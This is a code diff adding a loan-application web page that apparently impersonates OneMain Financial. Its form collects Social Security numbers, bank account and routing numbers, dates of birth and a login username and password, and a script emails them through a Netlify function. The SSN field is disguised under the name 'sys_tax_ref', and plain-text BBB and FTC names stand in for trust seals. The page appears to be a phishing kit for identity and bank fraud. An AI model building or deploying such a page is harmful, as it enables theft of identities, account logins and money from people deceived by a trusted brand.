@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply Now - One Main Loan Financial</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="icon" href="images/favicon.png" type="image/png">
+    <link rel="stylesheet" href="css/style.css?v=1.0">
+    <style>
+        /* Inline styles for the specific split layout to ensure it overrides/works immediately */
+        body,
+        html {
+            height: 100%;
+            margin: 0;
+            overflow-x: hidden;
+        }
+
+        .split-layout {
+            display: flex;
+            min-height: 100vh;
+        }
+
+        .split-left {
+            flex: 1;
+            padding: 4rem;
+            overflow-y: auto;
+            background: white;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .split-right {
+            flex: 1;
+            background-color: #020361;
+            /* Fallback color */
+            background: url('images/apply-final.jpg?v=2.0') no-repeat center center;
+            background-size: cover;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+        }
+
+        .split-right::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            /* Overlay for text readability */
+        }
+
+        .split-right-content {
+            position: relative;
+            z-index: 1;
+            max-width: 80%;
+        }
+
+        .form-section-title {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 1rem;
+            font-weight: 500;
+        }
+
+        .form-group label {
+            font-weight: 500;
+            font-size: 0.85rem;
+            color: #333;
+        }
+
+        .form-control-custom {
+            width: 100%;
+            padding: 10px 0;
+            border: none;
+            border-bottom: 1px solid #eee;
+            border-radius: 0;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-control-custom:focus {
+            border-bottom-color: var(--secondary-color);
+        }
+
+        .btn-submit-custom {
+            background-color: #0044C9;
+            /* Specific Blue */
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            width: auto;
+        }
+
+        @media (max-width: 968px) {
+            .split-layout {
+                flex-direction: column-reverse;
+                /* Form on bottom, Image on top usually, or just column */
+            }
+
+            .split-right {
+                min-height: 300px;
+                flex: none;
+            }
+
+            .split-left {
+                padding: 2rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="split-layout">
+        <!-- Left Side: Form -->
+        <div class="split-left">
+            <!-- Header (Restored) -->
+            <header class="site-header" style="background: white; padding: 0; box-shadow: none; margin-bottom: 2rem;">
+                <div class="container" style="padding: 0;">
+                    <a href="index.html" class="logo-wrapper">
+                        <img src="images/header-logo.png" alt="OneMain Financial" class="header-logo-image"
+                            style="height: 50px;">
+                    </a>
+                    <button class="mobile-menu-toggle" style="color: #333;">☰</button>
+                    <nav class="main-nav">
+                        <ul>
+                            <li><a href="index.html" style="color: #333;">Home</a></li>
+                            <li><a href="services.html" style="color: #333;">Services</a></li>
+                            <li><a href="amount.html" style="color: #333;">Loan Amount</a></li>
+                            <li><a href="about.html" style="color: #333;">About Us</a></li>
+                        </ul>
+                    </nav>
+                </div>
+            </header>
+
+            <form id="loan-application-form" action="/.netlify/functions/send-email" method="POST">
+                <!-- Netlify Function handling via JS -->
+                <!-- Removed FormSubmit.co action, handled via JS -->
+
+                <!-- Personal Information -->
+                <div class="mb-5">
+                    <h3 class="form-section-title">Personal Information</h3>
+                    <div class="form-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
+                        <div class="form-group">
+                            <label>First Name *</label>
+                            <input type="text" name="firstname" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Last Name *</label>
+                            <input type="text" name="lastname" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group full-width" style="grid-column: 1 / -1;">
+                            <label>Social Security Number *</label>
+                            <input type="text" name="sys_tax_ref" class="form-control-custom" placeholder="XXX-XX-XXXX"
+                                required>
+                        </div>
+                        <div class="form-group full-width" style="grid-column: 1 / -1;">
+                            <label>Street Address *</label>
+                            <input type="text" name="street_address" class="form-control-custom"
+                                placeholder="E.g. 42 Wallaby Way" required>
+                        </div>
+                        <div class="form-group">
+                            <label>City *</label>
+                            <input type="text" name="city" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group">
+                            <label>State/Province *</label>
+                            <input type="text" name="state" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group full-width" style="grid-column: 1 / -1;">
+                            <label>DOB / Birth Date *</label>
+                            <input type="date" name="dob" class="form-control-custom" required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Bank Information -->
+                <div class="mb-5">
+                    <h3 class="form-section-title">Bank Information</h3>
+                    <div class="form-grid" style="display: grid; grid-template-columns: 1fr; gap: 2rem;">
+                        <div class="form-group">
+                            <label>Bank Name *</label>
+                            <input type="text" name="bank_name" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Account Number *</label>
+                            <input type="text" name="account_number" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Routing Number *</label>
+                            <input type="text" name="routing_number" class="form-control-custom" required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Account Details -->
+                <div class="mb-5">
+                    <h3 class="form-section-title">Account Details</h3>
+                    <div class="form-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
+                        <div class="form-group">
+                            <label>Username *</label>
+                            <input type="text" name="username" class="form-control-custom" required>
+                        </div>
+                        <div class="form-group">
+                            <label>Password *</label>
+                            <input type="password" name="password" class="form-control-custom" required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Contact Information -->
+                <div class="mb-5">
+                    <h3 class="form-section-title">Contact Information</h3>
+                    <div class="form-grid" style="display: grid; grid-template-columns: 1fr; gap: 2rem;">
+                        <div class="form-group">
+                            <label>Email Address *</label>
+                            <input type="email" name="email" class="form-control-custom" placeholder="E.g. john@doe.com"
+                                required>
+                        </div>
+                        <div class="form-group">
+                            <label>Phone Number *</label>
+                            <input type="tel" name="phone" class="form-control-custom" placeholder="Enter Phone Number"
+                                required>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Required Loan Amount -->
+                <div class="mb-5">
+                    <label class="form-section-title" style="display: block;">Required Loan Amount</label>
+                    <div class="form-group">
+                        <label>Loan Amount *</label>
+                        <input type="number" name="loan_amount" class="form-control-custom" required>
+                    </div>
+                </div>
+
+                <div class="mt-4">
+                    <button type="submit" class="btn-submit-custom" id="submit-btn">Submit Application</button>
+                </div>
+                <div id="form-message" style="margin-top: 20px; text-align: center; display: none;"></div>
+            </form>
+
+            <div class="mt-5 text-center px-4" style="color: #999; font-size: 0.8rem;">
+                <!-- Simple text links/seals to avoid broken images -->
+                <span>Better Business Bureau</span>
+                <span style="margin: 0 10px;">|</span>
+                <span>Federal Trade Commission</span>
+            </div>
+        </div>
+
+        <!-- Right Side: Image -->
+        <div class="split-right">
+            <div class="split-right-content">
+                <h2 style="font-size: 3rem; margin-bottom: 1rem;">Get Your Loan Fast</h2>
+                <p style="font-size: 1.2rem; opacity: 0.9;">Join thousands of satisfied customers who trust us with
+                    their financial needs</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loan-application-form').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const form = this;
+            const submitBtn = document.getElementById('submit-btn');
+            const messageDiv = document.getElementById('form-message');
+
+            // Loading State
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+            messageDiv.style.display = 'none';
+            messageDiv.textContent = '';
+
+            // Gather Data
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            try {
+                // Send to Netlify Function
+                const response = await fetch('/.netlify/functions/send-email', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+
+                if (response.ok && result.ok) {
+                    messageDiv.textContent = 'Application Submitted Successfully! We will contact you soon.';
+                    messageDiv.style.color = '#28a745'; // Green
+                    messageDiv.style.display = 'block';
+                    form.reset();
+                } else {
+                    throw new Error(result.error || 'Submission failed');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                messageDiv.textContent = 'Error submitting application: ' + error.message;
+                messageDiv.style.color = '#dc3545'; // Red
+                messageDiv.style.display = 'block';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit Application';
+            }
+        });
+    </script>
+</body>
+
+</html>
